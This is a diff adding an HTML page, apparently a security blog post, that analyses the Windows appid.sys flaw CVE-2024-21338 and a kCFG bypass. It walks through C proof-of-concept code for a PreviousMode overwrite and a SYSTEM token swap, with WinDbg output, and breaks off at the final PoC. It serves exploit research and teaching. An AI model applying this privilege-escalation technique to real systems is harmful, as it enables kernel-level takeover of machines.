@@ -1,0 +1,1495 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/&#34;&gt;Bypassing Windows Kernel Mitigations: Part1 - Overview&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &amp;#x2190; Now&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;After last month&amp;#x2019;s Part 1 introducing Windows Kernel Mitigation, we&amp;#x2019;re back with Part 2, and this time it&amp;#x2019;s time to dive into kCFG bypassing. We&amp;#x2019;ll analyze the Local Privilege Escalation vulnerability CVE-2024-21338 in appid.sys, which was patched in February 2024, and introduce three post-exploitation techniques to bypass kCFG.&lt;/p&gt;
+&lt;h2 id=&#34;CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34;&gt;&lt;a href=&#34;#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&#34;&gt;&lt;/a&gt;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Vulnerability analysis and exploitation was performed on Windows 23H2 build 22631.2861 (December 2023 Cumulative Update applied).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The CVE-2024-21338 vulnerability itself is simple! &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When the appid.sys driver processes an I/O request from user mode, it calls the &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; function with a user mode buffer (SystemBuffer) if the IOCTL Code is &lt;code&gt;0x22A018&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Called in the following order: &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; - &lt;code&gt;AppHashComputeFileHashesInternal&lt;/code&gt; - &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt;. In the &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; function, call a pointer at offset &lt;code&gt;SystemBuffer+0x16.&lt;/code&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By calling the user-mode controllable SystemBuffer in kernel context, the user will be able to call arbitrary callback pointers in kernel mode (red box). We can even control the address that references the first argument, rcx (blue box).&lt;/p&gt;
+&lt;p&gt;For more analysis and PoC, check out the reference links below!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&#34;&gt;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&#34;&gt;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now we can call any function we want, but can&amp;#x2019;t take advantage of any shellcode or ROP gadgets configured in user mode due to the existence of the mitgation below. &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SMEP that prevents the CPU from executing userland (ring 3) code while in Supervisor Mode (ring 0) privileged state.&lt;/li&gt;
+&lt;li&gt;kCFG that throws an exception and raises &lt;code&gt;KERNEL_SECURITY_CHECK_FAILURE&lt;/code&gt; if the kernel address is not registered in the bitmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even if the SMEP is bypassed by calling the address of the bypass gadget, it will still get stuck in kCFG because it is user-mode code.&lt;/p&gt;
+&lt;p&gt;Kernel exploits aimed at privilege escalation via token swapping require read and write access to kernel memory. To achieve this, three exploit techniques can establish Full Arbitrary Kernel Read/Write primitives by calling kernel functions that satisfy with kCFG.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;PreviousMode&lt;/li&gt;
+&lt;li&gt;SeDebugPrigvileges&lt;/li&gt;
+&lt;li&gt;I/O Ring Buffer&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;del&gt;In this part, I will introduce the above three techniques&lt;/del&gt; Due to lack of time, I will only introduce the exploit using PreviousMode in this part&amp;#x2026; and will cover the exploit using SeDebugPrivileges and I/O Ring Buffer in the next part!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;EXP-1-PreviousMode&#34;&gt;&lt;a href=&#34;#EXP-1-PreviousMode&#34; class=&#34;headerlink&#34; title=&#34;EXP 1 - PreviousMode&#34;&gt;&lt;/a&gt;EXP 1 - PreviousMode&lt;/h2&gt;&lt;p&gt;The first is via the PreviousMode modification.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode&#34;&gt;PreviousMode&lt;/a&gt; is a KTHREAD structure field that is a flag value that indicates that the thread&amp;#x2019;s parameters came from a user-mode process if the user-mode application called a native system service routine in either the &lt;strong&gt;Nt&lt;/strong&gt; or &lt;strong&gt;Zw&lt;/strong&gt; version. A PreviousMode value of 1 indicates that the current thread object was created by a call from user-mode, and a value of 0 indicates that it was created from kernel-mode. This serves to restrict kernel access to objects from user-mode.&lt;/p&gt;
+&lt;p&gt;PreviousMode is a field in the KTHREAD structure that acts as a flag. It indicates whether the thread&amp;#x2019;s parameters originated from a user-mode process. If a user-mode application calls a native system service routine (either the Nt or Zw version), PreviousMode reflects this.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A value of 1 means the thread was created by a call from user mode.&lt;/li&gt;
+&lt;li&gt;A value of 0 means it was created from kernel mode.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This flag helps restrict kernel access to objects originating from user mode&lt;/p&gt;
+&lt;p&gt;If we can modify the PrevousMode of a user-mode process to 0, we can call the &lt;code&gt;NtWriteVirtualMemory&lt;/code&gt; or &lt;code&gt;ReadProcessMemory&lt;/code&gt; functions to get the kernel memory RW primitives, which we&amp;#x2019;ll demonstrate with a simple example and debugging to help make it easier to understand!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
+
+_NtQuerySystemInformation pNtQuerySystemInformation;
+_NtFsControlFile pNtFsControlFile;
+_NtWriteVirtualMemory pNtWriteVirtualMemory;
+_NtReadVirtualMemory pNtReadVIrtualMemory;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
+	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
+
+	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	GetNtFunction();
+
+	DWORD pid = GetCurrentProcessId();
+	
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
+	GetObj(&amp;amp;KTHREAD, pid, hThread);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);
+
+	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+	GetObj(&amp;amp;EPROCESS, pid, hProc);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);
+
+	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);
+
+	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;modify previousmode in windbg and press any button..\n&amp;quot;&lt;/span&gt;);
+	getch();
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;
+	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// [3]&lt;/span&gt;
+	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
+	
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The above code works as follows&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Leak the required address via the &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; API&lt;/li&gt;
+&lt;li&gt;Overwrite the token value of the user-mode process to the system process&lt;/li&gt;
+&lt;li&gt;Spawn a cmd with system privileges&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In normal execution, nothing happens because the user-mode process cannot RW the kernel memory via &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#x2026;but we will now modify PreviouMode in the debugger before calling &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt; and do the privilege escalation.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When we run it, it will output the KTHREAD/EPROCESS address of the current process and the EPROCESS address of the SYSTEM process. Copy these and go to windbg.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
+...
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see that PreviouMode is located at &lt;code&gt;KTHREAD+0x232&lt;/code&gt;. Since the current process is in user mode, we can see that the PreviouMode is 1. Now, in the Memory window of windbg, modify that value to 0.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
+nt!_KTHREAD
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
+...
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
+   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Back in the Analytics machine, press any button to proceed to the next step. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
+system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Kernel Read/Write is now possible with &lt;code&gt;pNtWritevirtualMemory&lt;/code&gt; function through PreviousMode modification. After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I got a BSOD.. ??&lt;/p&gt;
+&lt;p&gt;The problem occurs when we modify PreviousMode to kernel mode and then try to create a process with system privileges. Since the kernel mode PreviousMode is not needed after token swapping, it should be restored to its original value of 1 before creating the cmd process so that the process can be created without crashing.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
+*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+
+pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
+system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If we add the code above and try again&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can modify the PreviousMode to achieve elevated privileges.&lt;/p&gt;
+&lt;p&gt;Coming back to the kCFG bypass, we can modify the PreviouMode by calling a normal kernel function registered in the kCFG bitmap after triggering the untrusted pointer dereference vulnerability of CVE-2024-21338. But&amp;#x2026; how do we find this function among the many, many kernel functions :(&lt;/p&gt;
+&lt;p&gt;One function worth noting is the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; kernel macro. This macro decrements the reference count field of the object address being passed (offset -0x30), so it would be a perfect macro to change PreviousMode from a user-mode value of 1 to a kernel-mode value of 0.&lt;/p&gt;
+&lt;p&gt;However, there is one limitation to calling &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; directly. As we saw earlier in the bug trigger, we can&amp;#x2019;t directly control the value of the first argument, but only indirectly control the value.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We need to find another wrapper function that allows us to dereference rcx once and pass the value as an argument to the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro so that we can control it directly.&lt;/p&gt;
+&lt;p&gt;If we look far enough down the cross-reference list of the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro, we find the &lt;code&gt;ExpProfileDelete&lt;/code&gt; function that satisfies that condition.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs lua&#34;&gt;void __fastcall ExpProfileDelete(__int64 a1)
+{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;) )
+  {
+    KeStopProfile(*(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;));
+    MmUnmapLockedPages(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;), *(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
+    MmUnlockPages(*(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
+    ExFreePoolWithTag(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)a1 )
+    ObfDereferenceObjectWithTag(*(PVOID *)a1, &lt;span class=&#34;hljs-number&#34;&gt;0x66507845&lt;/span&gt;u);
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We call it by passing the value referencing the first argument to &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt;, which gives us direct control over the first argument of the macro. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2011.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First of all, when calling the &lt;code&gt;ExpProfileDelete&lt;/code&gt; function via CVE-2024-21338 vulnerability, kCFG is bypassed and jumps to the &lt;code&gt;ExpProfileDelete&lt;/code&gt; address.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The &lt;code&gt;ExpProfileDelete&lt;/code&gt; function address can be obtained by calculating the offset from the ntoskrnle.exe base obtained via &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; in Part 1.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%2012.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Inside &lt;code&gt;ExpProfileDelete&lt;/code&gt;, the rcx at the time of the &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; macro call comes out as &lt;code&gt;0x414141414141414141&lt;/code&gt;. We can finally decrement the address we want!&lt;/p&gt;
+&lt;p&gt;There may be more functions that satisfy our conditions, even if they are not &lt;code&gt;ExpProfileDelete&lt;/code&gt;. However, the more complex the logic of the function, the more likely it is to crash and execute code other than our intended behavior, so it&amp;#x2019;s probably a good idea to find a relatively simple function to target.&lt;/p&gt;
+&lt;p&gt;Below is the final proof-of-concept code that modifies PreviousMode and performs Token Swapping with CVE-2024-21338 vulnerability&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
